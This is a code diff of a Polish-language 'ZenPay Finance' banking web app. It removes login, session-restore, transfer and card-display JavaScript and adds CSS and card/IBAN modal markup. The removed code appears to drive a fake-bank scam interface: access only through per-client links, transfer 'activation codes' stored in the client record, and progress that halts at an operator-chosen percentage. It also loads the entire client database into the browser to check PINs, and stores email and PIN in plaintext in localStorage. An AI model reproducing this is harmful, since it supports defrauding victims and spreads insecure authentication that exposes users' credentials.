+.verify-code-section.has-error {
+  position: relative;
+  z-index: 200;
 }
 
-function updateAvatars() {
-  if (!user) return;
-  const initials = user.nom.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
-  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) el.textContent = initials;
-  });
+.field-error {
+  display: none;
+  position: absolute;
+  top: calc(100% + 10px);
+  left: 10px;
+  max-width: 320px;
+  width: max-content;
+  min-width: 220px;
+  background: #fff;
+  border: 1px solid #d1d5db;
+  border-radius: 10px;
+  padding: 10px 14px;
+  font-size: 13px;
+  font-weight: 500;
+  color: #374151;
+  box-shadow: 0 6px 24px rgba(0,0,0,0.14);
+  z-index: 9999;
+  align-items: center;
+  gap: 10px;
+  line-height: 1.4;
+  white-space: normal;
+  word-break: break-word;
+  pointer-events: none;
 }
 
-function updateCurrency() {
-  if (!user) return;
-  const devCode = normalizeDevise(user.devise);
-  const sym = getDeviseSymbol(devCode);
-  const label = getDeviseLabel(devCode);
-  const cs = document.getElementById('currency-symbol');
-  if (cs) cs.textContent = sym;
-  document.getElementById('stat-devise').textContent = label;
-  adjustAllTexts();
+.field-error.visible {
+  display: flex;
+  animation: tooltipPop 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
 }
 
-function updateNotifBadge() {
-  const hasNotif = user && user.notification && user.notification.trim() !== '';
-  ['notif-badge', 'notif-badge2', 'notif-badge3', 'notif-badge4', 'notif-badge5'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) {
-      if (hasNotif) el.classList.remove('hidden');
-      else el.classList.add('hidden');
-    }
-  });
+.field-error::before {
+  content: '';
+  position: absolute;
+  bottom: 100%;
+  left: 22px;
+  border-left: 8px solid transparent;
+  border-right: 8px solid transparent;
+  border-bottom: 8px solid #d1d5db;
 }
 
-// ===== AFFICHAGE =====
-const show = id => {
-  document.querySelectorAll('.screen').forEach(s => {
-    s.classList.remove('active');
-    s.style.display = 'none';
-  });
-  const banned = document.getElementById('banned-screen');
-  if (banned) banned.style.display = 'none';
-  const target = document.getElementById(id);
-  if (target) {
-    target.style.display = '';
-    target.classList.add('active');
-  }
-  document.getElementById('mainNav').style.display = (id === 'login' ? 'none' : 'grid');
-  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-  const map = { 'dashboard': 0, 'transfer': 1 };
-  if (map[id] !== undefined) {
-    document.querySelectorAll('.nav-item')[map[id]]?.classList.add('active');
-  }
-  if (id === 'dashboard') {
-    setTimeout(() => adjustAllTexts(), 50);
-  }
-};
-window.show = show;
-
-window.addEventListener('popstate', (e) => {
-  if (user) {
-    show('dashboard');
-  } else {
-    const saved = localStorage.getItem('zenpay_session');
-    if (saved) {
-      try {
-        const parsed = JSON.parse(saved);
-        if (parsed.id) {
-          document.getElementById('email').value = parsed.e || '';
-          document.getElementById('pin').value = parsed.p || '';
-          login({ silent: true, redirect: true }).catch(() => show('login'));
-          return;
-        }
-      } catch {}
-    }
-    show('login');
-  }
-});
-
-async function forceLogout(isDeleted = false) {
-  if (user && user._id && sessionId) {
-    try {
-      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
-    } catch(e) {}
-  }
-  localStorage.removeItem('zenpay_session');
-  localStorage.removeItem('zenpay_session_id');
-  localStorage.removeItem('zenpay_client_id');
-  localStorage.removeItem('zenpay_theme');
-  user = null;
-  if (historyListener) historyListener();
-  if (balanceListener) balanceListener();
-  if (statusListener) statusListener();
-  if (banqueRef) banqueRef();
-  clearBannerTimer();
-  if (isDeleted) {
-    showBanned();
-    return;
-  }
-  show('login');
-  const errEl = document.getElementById('err');
-  if (errEl) errEl.classList.add('hidden');
-  history.replaceState({ screen: 'login' }, '', '#login');
+.field-error::after {
+  content: '';
+  position: absolute;
+  bottom: 100%;
+  left: 23px;
+  border-left: 7px solid transparent;
+  border-right: 7px solid transparent;
+  border-bottom: 7px solid #fff;
+  margin-bottom: -1px;
 }
 
-// ===== LOGIN =====
-window.login = async function(options = { silent: false, redirect: false }) {
-  const btn = document.getElementById('loginBtn');
-  btn.disabled = true;
-  showLoading('Logowanie...');
-
-  const e = document.getElementById('email').value.trim().toLowerCase();
-  const p = document.getElementById('pin').value.trim();
-  const err = document.getElementById('err');
-  err.classList.add('hidden');
-
-  if (!window.__clientIdFromUrl) {
-    err.textContent = 'Brak dostępu – nieprawidłowy link. Użyj linku, który otrzymałeś.';
-    err.classList.remove('hidden');
-    localStorage.removeItem('zenpay_session');
-    localStorage.removeItem('zenpay_client_id');
-    if (!options.silent) {
-      show('login');
-    }
-    hideLoading();
-    btn.disabled = false;
-    return;
-  }
-
-  try {
-    const s = await get(ref(db, 'clients'));
-    const d = s.val() || {};
-    let f = null,
-      fid = null;
-    for (const k in d) {
-      const v = d[k];
-      if (v.email && v.email.toLowerCase() === e && String(v.pin) === p) {
-        f = v;
-        fid = k;
-        break;
-      }
-    }
-
-    if (!f) {
-      err.textContent = 'Błąd logowania – sprawdź email i PIN';
-      err.classList.remove('hidden');
-      localStorage.removeItem('zenpay_session');
-      localStorage.removeItem('zenpay_client_id');
-      if (!options.silent) {
-        show('login');
-      }
-      hideLoading();
-      btn.disabled = false;
-      return;
-    }
-
-    if (fid !== window.__clientIdFromUrl) {
-      err.textContent = 'Te dane logowania nie pasują do tego linku. Użyj swojego własnego linku do logowania.';
-      err.classList.remove('hidden');
-      localStorage.removeItem('zenpay_session');
-      localStorage.removeItem('zenpay_client_id');
-      if (!options.silent) {
-        show('login');
-      }
-      hideLoading();
-      btn.disabled = false;
-      return;
-    }
-
-    if (f.blocked) {
-      err.textContent = 'Konto zostało zablokowane';
-      err.classList.remove('hidden');
-      localStorage.removeItem('zenpay_session');
-      localStorage.removeItem('zenpay_client_id');
-      if (!options.silent) {
-        show('login');
-      }
-      hideLoading();
-      btn.disabled = false;
-      return;
-    }
-
-    user = f;
-    user._id = fid;
-    if (!user.devise) user.devise = 'zł';
-    if (!user.theme) user.theme = 'teal';
-    user.refundCode = user.refundCode || '';
-    user.bannerMessage = user.bannerMessage || '';
-    user.bannerRead = user.bannerRead || false;
-
-    localStorage.setItem('zenpay_session', JSON.stringify({ e, p }));
-    localStorage.setItem('zenpay_theme', user.theme);
-    localStorage.setItem('zenpay_client_id', fid);
-
-    document.getElementById('greet').innerHTML = `Witaj, <span>${user.nom}</span>`;
-    adjustGreetingFontSize();
-
-    await updateSession(true);
-
-    const balElement = document.getElementById('bal');
-    const statBalElement = document.getElementById('stat-balance');
-    updateBalanceDisplay(balElement, statBalElement, user.montant);
-    document.getElementById('bal2').textContent = fmt(user.montant);
-
-    applyTheme(user.theme);
-    updateAvatars();
-    updateCurrency();
-    updateNotifBadge();
-    updateProfileInfo();
-    updateBanner();
-
-    setupBankListener(fid);
-
-    await initHistoryListener(fid);
-    watchBalance(fid);
-    watchClientStatus(fid);
-
-    setupTransferValidation();
-    setupRequiredMessages();
-
-    adjustAllTexts();
-
-    if (options.redirect) {
-      navigateTo('dashboard');
-    } else if (!options.silent) {
-      navigateTo('dashboard');
-    } else {
-      show('dashboard');
-      history.replaceState({ screen: 'dashboard' }, '', '#dashboard');
-    }
-
-    hideLoading();
-    btn.disabled = false;
-  } catch (error) {
-    console.error('Erreur login:', error);
-    err.textContent = 'Erreur de connexion, réessayez';
-    err.classList.remove('hidden');
-    hideLoading();
-    btn.disabled = false;
-  }
-};
-
-// ===== DÉCONNEXION =====
-window.logout = async function() {
-  document.getElementById('acc').classList.add('hidden');
-
-  if (user && user._id && sessionId) {
-    try {
-      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
-    } catch(e) {}
-  }
-  localStorage.removeItem('zenpay_session');
-  localStorage.removeItem('zenpay_session_id');
-  localStorage.removeItem('zenpay_client_id');
-  localStorage.removeItem('zenpay_theme');
-  user = null;
-  if (historyListener) historyListener();
-  if (balanceListener) balanceListener();
-  if (statusListener) statusListener();
-  if (banqueRef) banqueRef();
-  clearBannerTimer();
-
-  show('login');
-  const errEl = document.getElementById('err');
-  if (errEl) errEl.classList.add('hidden');
-  history.replaceState({ screen: 'login' }, '', '#login');
-
-  document.getElementById('greet').innerHTML = 'Witaj, <span>Power</span>';
-  document.getElementById('bal').textContent = '0,00 zł';
-  document.getElementById('stat-balance').textContent = '0,00 zł';
-  document.getElementById('bal2').textContent = '0,00 zł';
-  document.getElementById('stat-tx').textContent = '0';
-  document.getElementById('tx-count-badge').textContent = '0';
-  document.getElementById('history-list').innerHTML =
-    `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
-  document.getElementById('accinfo').innerHTML = '';
-  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) el.textContent = 'FB';
-  });
-  document.getElementById('cardHolderName').textContent = 'JAN KOWALSKI';
-  document.getElementById('cardNumber').innerHTML = '<span>4556</span><span>5518</span><span>8867</span><span>XXXX</span>';
-  document.getElementById('cardExpiry').textContent = '02/28';
-  document.getElementById('cardCvv').textContent = '***';
-  document.getElementById('cardDetailHolder').textContent = 'JAN KOWALSKI';
-  document.getElementById('cardDetailNumber').textContent = '4556 5518 8867 XXXX';
-  document.getElementById('cardDetailNumber').dataset.realNumber = '455655188867XXXX';
-  document.getElementById('cardDetailExpiry').textContent = '02/28';
-  document.getElementById('cardDetailCvv').textContent = '***';
-  document.getElementById('cardDetailCvv').dataset.realCvv = '556';
-  cardVisible = false;
-  const eyeIcon = document.getElementById('eyeIcon');
-  const eyeText = document.getElementById('eyeText');
-  if (eyeIcon) eyeIcon.className = 'fa-regular fa-eye';
-  if (eyeText) eyeText.textContent = 'Pokaż';
-
-  if (user && user._id && sessionId) {
-    try {
-      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
-    } catch(e) { console.error(e); }
-  }
-
-  localStorage.removeItem('zenpay_session');
-  localStorage.removeItem('zenpay_session_id');
-  localStorage.removeItem('zenpay_client_id');
-  localStorage.removeItem('zenpay_theme');
-
-  if (historyListener) historyListener();
-  if (balanceListener) balanceListener();
-  if (statusListener) statusListener();
-  if (banqueRef) banqueRef();
-
-  user = null;
-  sessionId = null;
-};
-
-// ===== RESTAURATION DE SESSION =====
-const saved = localStorage.getItem('zenpay_session');
-const savedClientId = localStorage.getItem('zenpay_client_id');
-
-if (window.__clientIdFromUrl && savedClientId && savedClientId !== window.__clientIdFromUrl) {
-  localStorage.removeItem('zenpay_session');
-  localStorage.removeItem('zenpay_session_id');
-  localStorage.removeItem('zenpay_client_id');
-  localStorage.removeItem('zenpay_theme');
-  show('login');
-} else if (saved) {
-  try {
-    const parsed = JSON.parse(saved);
-    document.getElementById('email').value = parsed.e || '';
-    document.getElementById('pin').value = parsed.p || '';
-    if (!window.__clientIdFromUrl || (savedClientId && savedClientId === window.__clientIdFromUrl)) {
-      login({ silent: true, redirect: true }).catch(() => {
-        toast('Sesja wygasła, zaloguj się ponownie.');
-        forceLogout();
-      });
-    } else {
-      show('login');
-    }
-  } catch {
-    show('login');
-  }
+@keyframes tooltipPop {
+  0% { opacity: 0; transform: translateY(-6px) scale(0.96); }
+  100% { opacity: 1; transform: translateY(0) scale(1); }
 }
 
-// ===== PERSONNALISATION DES MESSAGES REQUIS EN POLONAIS =====
-function setupRequiredMessages() {
-  // Validation gérée par le système de messages d'erreur en temps réel
+.input-error {
+  border-color: #EF4444 !important;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.10) !important;
+  background: #fff !important;
 }
 
-// ===== VALIDATION EN TEMPS RÉEL DU MONTANT =====
-function setupTransferValidation() {
-  const amtInput = document.getElementById('a');
-  const continueBtn = document.getElementById('continueBtn');
-  if (!amtInput || !continueBtn) return;
-
-  // Validation en temps réel du montant
-  amtInput.addEventListener('input', function() {
-    validateAmountField();
-  });
-  amtInput.addEventListener('blur', function() {
-    validateAmountField();
-  });
-
-  // Validation en temps réel des autres champs
-  const fieldMessages = {
-    'b': 'Proszę wpisać imię i nazwisko beneficjenta.',
-    'c': 'Proszę wpisać numer IBAN lub konta.',
-    'd': 'Proszę wpisać kod BIC/SWIFT.',
-    'e': 'Proszę wpisać nazwę banku.',
-    'f': 'Proszę wpisać powód przelewu.'
-  };
-
-  ['b', 'c', 'd', 'e', 'f'].forEach(id => {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.addEventListener('input', function() {
-      validateTextField(id, fieldMessages[id]);
-      validateAmountField();
-    });
-    el.addEventListener('blur', function() {
-      validateTextField(id, fieldMessages[id]);
-    });
-  });
-
-  // Désactiver le bouton au départ
-  continueBtn.disabled = true;
+.input-error:focus {
+  border-color: #EF4444 !important;
+  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.10) !important;
 }
 
-// ===== TRANSFERT =====
-window.toVerify = function() {
-  clearAllTransferErrors();
-
-  if (!validateAllTransferFields()) {
-    return;
+@media (max-width: 480px) {
+  .field-error {
+    font-size: 12px;
+    padding: 8px 12px;
+    left: 6px;
+    max-width: 280px;
+    min-width: 180px;
   }
-
-  const rawValue = document.getElementById('a').value.trim();
-  const amt = Number(rawValue);
-
-  document.getElementById('va').textContent = fmt(amt);
-  document.getElementById('vb').textContent = document.getElementById('b').value;
-  document.getElementById('vc').textContent = document.getElementById('c').value;
-  document.getElementById('vd').textContent = document.getElementById('d').value;
-  document.getElementById('ve').textContent = document.getElementById('e').value;
-  document.getElementById('vf').textContent = document.getElementById('f').value;
-  navigateTo('verify');
-};
-
-// ===== FINISH =====
-window.finish = function() {
-  if (!user) return;
-
-  const codeInput = document.getElementById('code');
-  const code = codeInput.value.trim();
-
-  if (!code) {
-    showFieldError('code', 'Proszę wprowadzić kod aktywacyjny.');
-    return;
+  .field-error::before {
+    left: 18px;
   }
-
-  if (code !== user.code) {
-    showFieldError('code', 'Nieprawidłowy kod aktywacyjny.');
-    return;
+  .field-error::after {
+    left: 19px;
   }
-
-  clearFieldError('code');
-
-  const amt = Number(document.getElementById('a').value) || 0;
-  const benef = document.getElementById('b').value || '-';
-  const iban = document.getElementById('c').value || '-';
-  const swift = document.getElementById('d').value || '-';
-  const bank = document.getElementById('e').value || '-';
-  const reason = document.getElementById('f').value || '';
-
-  transferData = {
-    amount: amt,
-    amountFormatted: fmt(amt),
-    benef: benef,
-    iban: iban,
-    swift: swift,
-    bank: bank,
-    reason: reason
-  };
-
-  navigateTo('progress');
-
-  setTimeout(() => {
-    startProgress(amt, benef, iban, bank, reason);
-  }, 300);
-};
-
-// ===== PROGRESSION =====
-let transferData = {};
-
-function startProgress(amount, beneficiary, iban, bank, reason) {
-  console.log('🚀 startProgress appelé avec :', { amount, beneficiary, iban, bank, reason });
-
-  document.getElementById('pAmount').textContent = fmt(amount);
-  document.getElementById('pBenef').textContent = beneficiary;
-  document.getElementById('pIban').textContent = iban;
-  document.getElementById('pBank').textContent = bank;
-  const reasonRow = document.getElementById('pReasonRow');
-  if (reason && reason.trim() !== '') {
-    document.getElementById('pReason').textContent = reason;
-    reasonRow.style.display = 'block';
-  } else {
-    reasonRow.style.display = 'none';
-  }
-
-  const pct = Number(user.pct) || 100;
-  const msg = user.msg || '';
-  const fill = document.getElementById('progressFill');
-  const percentEl = document.getElementById('progressPercent');
-
-  let w = 0;
-  const interval = setInterval(() => {
-    w += 1;
-    const cur = Math.min(w, pct);
-    fill.style.width = cur + '%';
-    percentEl.textContent = cur + '%';
-    if (w >= pct) {
-      clearInterval(interval);
-      console.log('✅ Pourcentage atteint :', pct);
-      setTimeout(async () => {
-        const icon = document.getElementById('resultIcon');
-        const status = document.getElementById('resultStatus');
-        const percentResult = document.getElementById('resultPercent');
-        const benefEl = document.getElementById('resultBenef');
-        const amountEl = document.getElementById('resultAmount');
-        const accountEl = document.getElementById('resultAccount');
-        const msgEl = document.getElementById('resultMsg');
-
-        percentResult.textContent = cur + '%';
-        if (pct >= 100) {
-          icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
-          status.textContent = 'Przelew zatwierdzony';
-          const amt = Number(transferData.amount) || 0;
-          const newMontant = Number(user.montant) - amt;
-          user.montant = newMontant;
-
-          console.log('💰 Mise à jour du solde :', newMontant);
-          try {
-            await update(ref(db, 'clients/' + user._id), { montant: newMontant });
-            console.log('✅ Solde mis à jour');
-
-            const { dateStr, timeStr, timestamp } = getPolandDateTime();
-            const tx = {
-              id: genId('DE'),
-              title: 'Przelew wysłany',
-              subtitle: transferData.benef,
-              amount: -amt,
-              beneficiary: transferData.benef,
-              iban: transferData.iban,
-              devise: user.devise || 'zł',
-              date: dateStr,
-              time: timeStr,
-              timestamp: timestamp
-            };
-            console.log('📤 Enregistrement de la transaction :', tx);
-            await push(ref(db, 'clients/' + user._id + '/history'), tx);
-            console.log('✅ Transaction enregistrée');
-            toast(`-${fmt(amt)}`);
-
-            const nomClient = user.nom || 'Klient';
-            const formattedAmount = amt.toLocaleString('pl-PL') + ' ' + (user.devise || 'zł');
-            const bannerMsg = `Witam ${nomClient}, Przelew ${formattedAmount} został wysłany do ${beneficiary}.`;
-            console.log('📢 Écriture de la bannière de débit :', bannerMsg);
-
-            await update(ref(db, 'clients/' + user._id), { bannerMessage: '', bannerRead: true });
-            await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
-            console.log('✅ Bannière générée');
-
-            user.bannerMessage = bannerMsg;
-            user.bannerRead = false;
-            updateBanner();
-
-          } catch (err) {
-            console.error('❌ Erreur lors de l\'enregistrement du transfert:', err);
-            toast('❌ Erreur lors de l\'enregistrement du transfert');
-          }
-
-          const balElement = document.getElementById('bal');
-          const statBalElement = document.getElementById('stat-balance');
-          updateBalanceDisplay(balElement, statBalElement, user.montant);
-          document.getElementById('bal2').textContent = fmt(user.montant);
-          updateProfileInfo();
-
-        } else {
-          icon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#EAB308;"></i>';
-          status.textContent = 'Przelew zatrzymany';
-        }
-        benefEl.textContent = transferData.benef;
-        amountEl.textContent = transferData.amountFormatted;
-        accountEl.textContent = transferData.iban;
-        const { dateStr, timeStr } = getPolandDateTime();
-        document.getElementById('resultDate').textContent = dateStr + ' • ' + timeStr;
-        msgEl.textContent = msg || (pct >= 100 ? 'Środki zostaną przelane w ciągu 1-2 dni roboczych.' : 'Transakcja została przerwana.');
-
-        const successFinal = (pct >= 100);
-        const refNum = genId('REF');
-        sendMail({
-          to: user.email,
-          name: user.nom || 'Klient',
-          pct: pct,
-          success: successFinal,
-          montant: transferData.amountFormatted,
-          beneficiaire: transferData.benef,
-          compte: transferData.iban,
-          reference: refNum,
-          isRefund: false
-        })
-        .then(() => console.log('✅ BIP envoyé avec nouvelle API'))
-        .catch((error) => {
-          console.error('❌ Erreur envoi BIP:', error);
-          toast('Erreur lors de l\'envoi du BIP');
-        });
-
-        navigateTo('result');
-      }, 500);
-    }
-  }, 80);
 }
+</style>
+        <div style="position:absolute;top:-30%;right:-20%;width:160px;height:160px;background:radial-gradient(circle,rgba(13,148,136,0.15) 0%,transparent 70%);border-radius:50%;"></div>
+        <div style="position:absolute;bottom:-40%;left:-30%;width:180px;height:180px;background:radial-gradient(circle,rgba(20,184,166,0.1) 0%,transparent 70%);border-radius:50%;"></div>
+        <div style="display:flex;justify-content:space-between;align-items:flex-start;padding:16px 18px 0;position:relative;z-index:2;">
+          <div style="display:flex;align-items:center;gap:6px;">
+            <div style="width:34px;height:24px;border-radius:4px;background:linear-gradient(135deg,#d4af37,#c5a028,#e8c84a,#c5a028,#d4af37);position:relative;overflow:hidden;box-shadow:0 2px 6px rgba(0,0,0,0.3);">
+              <div style="position:absolute;inset:2px;border:1px solid rgba(0,0,0,0.15);border-radius:2px;"></div>
+              <div style="position:absolute;top:50%;left:0;right:0;height:1px;background:rgba(0,0,0,0.1);"></div>
+              <div style="position:absolute;top:0;bottom:0;left:28%;width:1px;background:rgba(0,0,0,0.1);"></div>
+              <div style="position:absolute;top:0;bottom:0;left:calc(28% + 12px);width:1px;background:rgba(0,0,0,0.1);"></div>
+            </div>
+            <i class="fa-solid fa-wifi" style="color:rgba(255,255,255,0.5);font-size:16px;transform:rotate(90deg);"></i>
+          </div>
+          <i class="fa-brands fa-cc-visa" style="font-size:26px;color:rgba(255,255,255,0.9);"></i>
+        </div>
+        <div style="padding:20px 18px 0;position:relative;z-index:2;">
+          <div id="cardNumber" style="font-family:'Courier New',monospace;font-size:17px;font-weight:600;letter-spacing:2px;color:#fff;text-shadow:0 2px 4px rgba(0,0,0,0.3);display:flex;gap:10px;">
+            <span>4556</span><span>5518</span><span>8867</span><span>XXXX</span>
+          </div>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:flex-end;padding:12px 18px 16px;position:relative;z-index:2;">
+          <div>
+            <div style="font-size:8px;color:rgba(255,255,255,0.45);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:2px;">Posiadacz</div>
+            <div id="cardHolderName" style="font-size:11px;font-weight:600;color:#fff;text-transform:uppercase;letter-spacing:0.5px;">JAN KOWALSKI</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:8px;color:rgba(255,255,255,0.45);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:2px;">Ważna do</div>
+            <div id="cardExpiry" style="font-size:11px;font-weight:600;color:#fff;">02/28</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:8px;color:rgba(255,255,255,0.45);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:2px;">CVV</div>
+            <div id="cardCvv" style="font-family:'Courier New',monospace;font-size:12px;font-weight:700;color:#fff;letter-spacing:2px;">556</div>
+          </div>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;">
+        <div style="background:#f8fafc;border:1px solid #f1f5f9;border-radius:8px;padding:10px 12px;">
+          <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;font-weight:500;">Posiadacz</div>
+          <div id="cardDetailHolder" style="font-size:12px;font-weight:700;color:var(--text-primary);text-transform:uppercase;letter-spacing:0.5px;">JAN KOWALSKI</div>
+        </div>
+        <div style="background:#f8fafc;border:1px solid #f1f5f9;border-radius:8px;padding:10px 12px;">
+          <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;font-weight:500;">Ważna do</div>
+          <div id="cardDetailExpiry" style="font-size:12px;font-weight:700;color:var(--text-primary);font-family:'Courier New',monospace;">02/28</div>
+        </div>
+        <div style="background:#f8fafc;border:1px solid #f1f5f9;border-radius:8px;padding:10px 12px;grid-column:1/-1;">
+          <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;font-weight:500;">Numer karty</div>
+          <div id="cardDetailNumber" style="font-size:13px;font-weight:700;color:var(--text-primary);font-family:'Courier New',monospace;letter-spacing:0.5px;">4556 5518 8867 XXXX</div>
+        </div>
+        <div style="background:#f8fafc;border:1px solid #f1f5f9;border-radius:8px;padding:10px 12px;">
+          <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;font-weight:500;">CVV</div>
+          <div id="cardDetailCvv" style="font-size:12px;font-weight:700;color:var(--text-primary);font-family:'Courier New',monospace;">***</div>
+        </div>
+        <div style="background:#f8fafc;border:1px solid #f1f5f9;border-radius:8px;padding:10px 12px;">
+          <div style="font-size:9px;color:#6b7280;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;font-weight:500;">Typ</div>
+          <div style="font-size:12px;font-weight:700;color:var(--text-primary);">Visa Debit</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;margin-bottom:12px;">
+        <button onclick="copyCardNumber()" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;border-radius:8px;font-size:13px;font-weight:600;border:none;background:var(--p-gradient);color:#fff;box-shadow:0 4px 12px rgba(13,148,136,0.3);cursor:pointer;">
+          <i class="fa-regular fa-copy"></i> Kopiuj numer
+        </button>
+        <button onclick="toggleCardVisibility()" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:10px;border-radius:8px;font-size:13px;font-weight:600;border:1px solid #e2e8f0;background:#f1f5f9;color:var(--text-primary);cursor:pointer;">
+          <i class="fa-regular fa-eye" id="eyeIcon"></i> <span id="eyeText">Pokaż</span>
+        </button>
+      </div>
+      <div style="display:flex;align-items:flex-start;gap:8px;padding:10px 12px;background:#fefce8;border-radius:8px;border-left:3px solid #eab308;">
+        <i class="fa-solid fa-shield-halved" style="color:#ca8a04;font-size:14px;margin-top:1px;flex-shrink:0;"></i>
+        <span style="font-size:11px;color:#854d0e;line-height:1.5;">Ostatnie 4 cyfry ukryte. Kliknij „Pokaż", aby ujawnić pełny numer.</span>
+      </div>
+    </div>
+  </div>
 
-// ===== CARTE =====
-let cardVisible = false;
-window.copyCardNumber = function() {
-  const num = document.getElementById('cardDetailNumber').textContent.replace(/\s/g, '');
-  navigator.clipboard.writeText(num).then(() => toast('✅ Numer skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
-};
-window.copyIban = function() {
-  const iban = document.getElementById('ibanNumber').textContent.replace(/\s/g, '');
-  navigator.clipboard.writeText(iban).then(() => toast('✅ IBAN skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
-};
-window.toggleCardVisibility = function() {
-  cardVisible = !cardVisible;
-  const eyeIcon = document.getElementById('eyeIcon');
-  const eyeText = document.getElementById('eyeText');
-  const cardNum = document.getElementById('cardNumber');
-  const detailNum = document.getElementById('cardDetailNumber');
-  const cvv = document.getElementById('cardCvv');
-  const detailCvv = document.getElementById('cardDetailCvv');
-  const realNum = (document.getElementById('cardDetailNumber').dataset.realNumber || document.getElementById('cardDetailNumber').textContent).replace(/\s/g, '');
-  const realCvv = document.getElementById('cardDetailCvv').dataset.realCvv || document.getElementById('cardDetailCvv').textContent;
-  if (cardVisible) {
-    eyeIcon.className = 'fa-regular fa-eye-slash'; eyeText.textContent = 'Ukryj';
-    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12), p4 = realNum.substring(12,16);
-    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>${p4}</span>`;
-    detailNum.textContent = `${p1} ${p2} ${p3} ${p4}`;
-    cvv.textContent = realCvv; detailCvv.textContent = realCvv;
-  } else {
-    eyeIcon.className = 'fa-regular fa-eye'; eyeText.textContent = 'Pokaż';
-    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12);
-    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
-    detailNum.textContent = `${p1} ${p2} ${p3} XXXX`;
-    cvv.textContent = '***'; detailCvv.textContent = '***';
-  }
-};
+  <!-- IBAN -->
+  <div id="ibanModal" class="modal hidden iban-modal" onclick="if(event.target===this)withSpinner(()=>closeIbanModal())">
+    <div class="modal-content" style="padding:0;overflow:hidden;max-width:400px;">
+      <button onclick="withSpinner(() => closeIbanModal())" class="modal-close" style="top:12px;right:12px;width:30px;height:30px;border:none;background:rgba(0,0,0,0.35);color:#fff;font-size:16px;box-shadow:0 2px 10px rgba(0,0,0,0.2);">×</button>
+      <div style="background:var(--p-gradient);padding:24px 20px 18px;color:#fff;position:relative;overflow:hidden;">
+        <div style="position:absolute;top:-30px;right:-20px;width:80px;height:80px;background:rgba(255,255,255,0.08);border-radius:50%;"></div>
+        <div style="position:absolute;bottom:-20px;left:-10px;width:60px;height:60px;background:rgba(255,255,255,0.05);border-radius:50%;"></div>
+        <div style="display:flex;align-items:center;gap:10px;position:relative;z-index:1;">
+          <div style="width:36px;height:36px;border-radius:10px;background:rgba(255,255,255,0.15);display:flex;align-items:center;justify-content:center;font-size:18px;backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,0.2);">
+            <i class="fa-solid fa-building-columns"></i>
+          </div>
+          <div><h3 style="font-size:16px;font-weight:700;margin:0;color:#fff;">Dane konta</h3><p style="font-size:11px;margin:2px 0 0;opacity:0.8;color:#fff;">ZenPay Finance</p></div>
+        </div>
+      </div>
+      <div style="padding:18px 20px 16px;">
+        <div style="background:#0f172a;border-radius:12px;padding:14px 16px;margin-bottom:14px;position:relative;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,0.12);">
+          <div style="position:absolute;top:-20px;right:-20px;width:60px;height:60px;background:rgba(255,255,255,0.03);border-radius:50%;"></div>
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;position:relative;z-index:1;">
+            <span style="font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1.5px;font-weight:500;">Numer IBAN</span>
+            <button onclick="copyIban()" style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);color:#fff;border-radius:5px;padding:4px 8px;font-size:10px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:4px;transition:background 0.2s;">
+              <i class="fa-regular fa-copy" style="font-size:9px;"></i> Kopiuj
+            </button>
+          </div>
+          <div style="font-size:14px;font-weight:700;color:#fff;font-family:'Courier New',monospace;letter-spacing:1.5px;word-break:break-all;position:relative;z-index:1;line-height:1.4;" id="ibanNumber">LT15 2339 1465 189X XXXX</div>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
+          <div style="background:#f8fafc;border-radius:8px;padding:12px 14px;border:1px solid #f1f5f9;">
+            <span style="font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;font-weight:500;display:block;margin-bottom:3px;">Właściciel</span>
